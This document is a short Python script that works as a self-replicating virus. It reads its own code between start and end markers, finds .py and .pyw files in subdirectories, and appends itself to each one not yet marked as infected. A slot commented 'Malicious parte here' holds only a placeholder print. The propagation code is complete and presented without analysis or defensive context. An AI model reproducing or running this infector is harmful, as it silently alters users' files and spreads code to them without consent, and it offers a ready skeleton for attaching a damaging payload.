### Start

import sys, glob

code = []
with open(sys.argv[0], 'r') as f:
  lines = f.readlines()

isArea = False
for line in lines:
  if line == '### Start\n':
    isArea = True
  if isArea:
    code.append(line)
  if line == '## End\n':
    break

python_scripts = glob.glob('*/*.pyw') + glob.glob('*/*.py')

for script in python_scripts:
  with open(script, 'r') as f:
    script_code = f.readlines()

    infected = False
    for line in script_code:
      if line == '### Start\n':
        infected = True
        break

  if not infected:
    final_code = []
    final_code.extend(script_code)
    final_code.extend('\n')
    final_code.extend(code)

    with open(script, 'w') as f:
      f.writelines(final_code)

## Malicious parte here
print("Hello, I'm here!")

## End